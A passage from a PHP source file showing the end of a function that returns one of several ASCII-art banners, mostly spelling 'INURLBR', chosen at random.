                |~ \___/ ~|         []|[]
                /=\ /=\ /=\         | | |
________________[_]_[_]_[_]________/_]_[_\_________________________
", "{$_SESSION["c1"]}
 ______   __  __  __  __  ____    __       ____     ____       
/\__  _\ /\ \/\ \/\ \/\ \/\  _`\ /\ \     /\  _`\  /\  _`\     
\/_/\ \/ \ \ `\\ \ \ \ \ \ \ \L\ \ \ \    \ \ \L\ \\ \ \L\ \   
   \ \ \  \ \ , ` \ \ \ \ \ \ ,  /\ \ \  __\ \  _ <'\ \ ,  /   
    \_\ \__\ \ \`\ \ \ \_\ \ \ \\ \\ \ \L\ \\ \ \L\ \\ \ \\ \  
    /\_____\\ \_\ \_\ \_____\ \_\ \_\ \____/ \ \____/ \ \_\ \_\
    \/_____/ \/_/\/_/\/_____/\/_/\/ /\/___/   \/___/   \/_/\/ /
", "{$_SESSION["c1"]}
 _____ ______  _     _ ______  _       ______ ______  
(_____)  ___ \| |   | (_____ \| |     (____  (_____ \ 
   _  | |   | | |   | |_____) ) |      ____)  )____) )
  | | | |   | | |   | (_____ (| |     |  __  (_____ ( 
 _| |_| |   | | |___| |     | | |_____| |__)  )    | |
(_____)_|   |_|\______|     |_|_______)______/     |_|
", "{$_SESSION["c1"]}
                           ______                                  
                        .-.      .-.                               
                       /            \                              
                      |  [ INURLBR ] |                             
                      |,  .-.  .-.  ,|                             
                      | )(|_/  \|_)( |                             
                      |/     /\     \|                             
              _       (_     ^^     _)                             
      _\ ____) \_______\__|IIIIII|__/_______________________________     
     (_)[___]{}<________|-\IIIIII/-|__INURL__INURL__INURL___________\    
       /     )_/        \          /                               
                         \ ______ / 
", "{$_SESSION["c1"]}
    
88 88b 88 88   88 88**Yb 88     88**Yb 88**Yb
88 88Yb88 88   88 88__dP 88     88__dP 88__dP
88 88 Y88 Y8   8P 88*Yb  88  .o 88**Yb 88*Yb 
88 88  Y8 `YbodP' 88  Yb 88ood8 88oodP 88  Yb
", "{$_SESSION["c1"]}
    
       #                                                
       ##                        ###                    
   ### ###  ##  ###  ##  ####### ###     ####### ####### 
   ### #### ##  ###  ##       ## ###          ##      ##
   ### #######  ###  ##  ######  ###     ######  ###### 
   ### ### ###  ###  ##  ##  ##  ###     ###  ## ##  ## 
   ### ###  ##   #####   ##   ## ####### ######  ##   ##
             #     
", "{$_SESSION["c1"]}
    
 __    __   __    __   _______  __      __    __   __    __   _______  __  
|  |  |  | |  |  |  | |   ____||  |    |  |  |  | |  |  |  | |   ____||  | 
|  |__|  | |  |  |  | |  |__   |  |    |  |__|  | |  |  |  | |  |__   |  | 
|   __   | |  |  |  | |   __|  |  |    |   __   | |  |  |  | |   __|  |  | 
|  |  |  | |  `--'  | |  |____ |__|    |  |  |  | |  `--'  | |  |____ |__| 
|__|  |__|  \______/  |_______|(__)    |__|  |__|  \______/  |_______|(__)                                                                          
", "{$_SESSION["c1"]}
 _            _          
| |__  _ __  | |__  _ __ 
| '_ \| '__| | '_ \| '__|
| |_) | |    | |_) | |   
|_.__/|_|    |_.__/|_| 
", "{$_SESSION["c1"]}
     ___      .__   __. .___________. __   _______    ___      
    /   \     |  \ |  | |           ||  | |   ____|  /   \     
   /  ^  \    |   \|  | `---|  |----`|  | |  |__    /  ^  \    
  /  /_\  \   |  . `  |     |  |     |  | |   __|  /  /_\  \   
 /  _____  \  |  |\   |     |  |     |  | |  |    /  _____  \  
/__/     \__\ |__| \__|     |__|     |__| |__|   /__/     \__\                                                              
");

    return ($banners[rand(0, count($banners) - 1)]);
}
